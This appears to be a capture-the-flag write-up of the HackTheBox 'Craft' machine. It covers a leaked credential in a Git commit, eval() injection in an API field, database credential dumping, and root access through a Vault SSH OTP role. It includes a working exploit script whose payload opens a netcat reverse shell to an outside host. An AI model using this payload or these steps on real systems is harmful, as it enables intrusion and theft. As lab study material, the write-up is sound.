---
title: "Craft - HackTheBox"
date: 2019-10-25T00:23:10+02:00
tags: []
draft: true
---

As usual, let's start with a quick port scan:
```
$ nmap -A -T4 10.10.10.110
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-24 18:27 EDT
Nmap scan report for 10.10.10.110
Host is up (0.045s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.88 seconds
```

Let's visit the web site:
![](/images/hackthebox/craft/site.png)

The two links in the upper right corner brings us to `api.craft.htb` and
`gogs.craft.htb`, so let's add them to `/etc/hosts` and visit the first one:

![](/images/hackthebox/craft/api.png)

Looks like we have instructions for an API.

The gogs subdomain sounds interesting, as gogs is a Git hosting server and it
could countain something interesting. Let's visit it. We can immediately
enumerate some users by visiting the users section:
![](/images/hackthebox/craft/users.png)

And there's a repository that seems looks like it contains the code
for the previously found API:
![](/images/hackthebox/craft/craft-repo.png)

Reading the commit history, specifically in commit `a2d28ed155`, we find out
that there was a password accidentally commited for the user `dinesh`:
![](/images/hackthebox/craft/api-key.png)

When something like this happens, the obvious thing to do is to change that
password, but visiting the login endpoint and using the credentials actually
works!

Let's explore more in depth the repository. Usually when there's an API that we
can interact with, I search in the code for calls to `eval` or `system` and
indeed there's one in the `brew` endpoint. Here's the vulnerable piece of code:

```python
@auth.auth_required
@api.expect(beer_entry)
def post(self):
    """
    Creates a new brew entry.
    """

    # make sure the ABV value is sane.
    if eval('%s > 1' % request.json['abv']):
        return "ABV must be a decimal value less than 1.0", 400
    else:
        create_brew(request.json)
        return None, 201
```

Reading the previously found API instructions, we can see that we can create a
new brew by making a POST request with the following data:
```json
{
  "id": 0,
  "brewer": "string",
  "name": "string",
  "style": "string",
  "abv": "string"
}
```

And in the API code, whatever we send in the `abv` field is then passed to the
`eval` function. Looks like RCE to me!

After searching a Python reverse shell online, given that the create a new brew
we have to be authenticated, let's use the previously found code to send our
payload in the `abv` field:
```python
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = {'X-Craft-API-Token': token, 'Content-Type': 'application/json'}

brew = {
    "name": "test",
    "brewer":"test",
    "style": "test",
    "abv":"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.81 1337 >/tmp/f')"
}

json_data = json.dumps(brew)
print(json_data)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

Let's start a netcat listener and run the exploit to get a shell:
```
$ nc -l 1337
/opt/app # whoami
root
```

At first it looks like we are root but looking around we find that we are inside
an Alpine machine, probably a container:
```
/opt/app # cat /etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.9.0
PRETTY_NAME="Alpine Linux v3.9"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"
```

There's an interesting file in that was in the `.gitignore` on the repo that now
we can read:
```
/opt/app # cat craft_api/settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

It contains the credentials for a database and there's another interesting file
ready to use, `dbtest.py`:
```python
#!/usr/bin/env python
import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

Modifying the query to `SHOW TABLES`, we can see that there is a table called
`user`, and using `SELECT * FROM user` gives us some credentials:

```
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
```

Trying to login into the Gogs service, only gilfoyle's credentials works.
He does have a private repository called `craft-infra`:
![](/images/hackthebox/craft/craft-intra.png)


Straight off, the `.ssh` directory contains a key, let's try to use it:
```
$ chmod 600 id_rsa
$ ssh gilfoyle@10.10.10.110 -i id_rsa
  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/

Enter passphrase for key 'id_rsa':
```
It is encrypted, but luckily the same password that we used to login in Gogs
works! And we can read the user flag:

```
gilfoyle@craft:~$ wc -c user.txt
33 user.txt
```

## Privilege escalation

The privilege escalation steps for this machine are pretty fast, but it took me
a bit because I didn't know the software to use.

In the `craft-intra` repository there's a file that points us towards the
solution, `vault/secrets.sh`:
```bash
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0`
```
Basically there's a software named Vault that allows us to create one time
passwords for ssh, and as it's configured on the machine, we can create
passwords for root also, you can read more about it
[here](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html).

With a simple command we can create a one time password:
```
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
Key                Value
---                -----
lease_id           ssh/creds/root_otp/428897bc-20d3-426b-93ab-7cbfe01597dd
lease_duration     768h
lease_renewable    false
ip                 127.0.0.1
key                7a51b704-46e4-4e93-5a08-4fabef7883bb
key_type           otp
port               22
username           root
```

And use `7a51b704-46e4-4e93-5a08-4fabef7883bb` to login as root:
```
gilfoyle@craft:~$ ssh root@127.0.0.1
root@craft:~# wc -c /root/root.txt
33 /root/root.txt
```

Thanks for reading!
